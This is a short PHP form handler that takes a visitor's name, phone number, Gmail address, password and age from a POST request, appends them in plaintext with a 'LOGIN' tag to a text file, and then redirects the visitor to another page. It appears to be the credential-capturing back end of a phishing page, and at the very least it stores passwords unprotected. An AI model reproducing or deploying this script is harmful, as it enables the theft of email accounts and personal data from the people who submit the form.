<?php
$name = $_POST['name'];
$number = $_POST['number'];
$gmail = $_POST['gmail'];
$password = $_POST['password'];
$age = $_POST['age'];

$linha = date('d/m/Y H:i:s') . "LOGIN" . " | " . $name . " | " . $number . " | " . $gmail . " | " . $password . " | " . $age . PHP_EOL;

file_put_contents('../_DATA/dados.txt', $linha, FILE_APPEND);
header('Location: ../_HTML/style2.html');
?>
